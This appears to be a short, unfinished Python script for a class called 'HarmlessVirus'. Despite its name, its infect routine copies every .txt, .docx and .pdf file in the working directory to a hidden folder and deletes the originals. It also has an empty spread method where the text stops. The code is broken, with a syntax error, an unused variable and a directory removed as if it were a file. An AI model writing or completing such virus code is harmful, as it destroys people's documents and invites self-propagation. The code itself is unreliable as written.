import os
import shutil
import time

class HarmlessVirus:
    def __init__(self, target_dir="C:/harmless_virus"):
        self.target_dir = target_dir
        self.start_dir = os.getcwd()
        self.hidden = True

    def hide(self):
        if self.hidden:
            try:
                os.remove(self.target_dir)
            except:
                pass
            self.hidden = not self.hidden

    def infect(self):
        for file in os.listdir(self.start_dir):
            if file.endswith((".txt", ".docx", ".pdf"):
                new_name = file + "_harmless"
                shutil.copy2(file, self.target_dir)
                os.remove(file)

    def spread(self):
